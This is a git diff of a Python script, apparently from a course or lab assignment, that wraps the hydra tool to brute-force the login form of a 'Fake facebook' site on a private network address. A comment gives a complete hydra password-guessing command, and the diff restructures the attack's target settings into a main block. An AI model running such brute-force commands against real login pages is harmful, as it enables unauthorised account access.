@@ -1,6 +1,8 @@
 import subprocess
-
 import re
+
+from ModuleB import moduleB
+from WebsiteInfo import WebsiteInfo
 
 # hydra -l arnav -P passwords.txt 10.202.208.81 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:S=Hello World!"
 
@@ -48,15 +50,17 @@ def attack(moduleB, website_info):
     else:
         print('failure')
 
-# From Part B
-username = 'arnav'
-passwords = '../passwords.txt'
-
-# From the database of things
-name = 'Fake facebook'
-ip_address = '192.168.2.65'
-port = '8080'
-service_mode = 'http-post-form'
-address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'
-
-attack(username, passwords, ip_address, service_mode, address_and_details, port)
+if __name__ == '__main__':
+    # From Part B
+    username = 'arnav'
+    module_b = moduleB(username)
+    
+    # From the database of things
+    name = 'Fake facebook'
+    ip_address = '192.168.2.65'
+    port = '8080'
+    service_mode = 'http-post-form'
+    address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'
+    website_info = WebsiteInfo(name, ip_address, service_mode, address_and_details, port)
+    
+    attack(module_b, website_info)
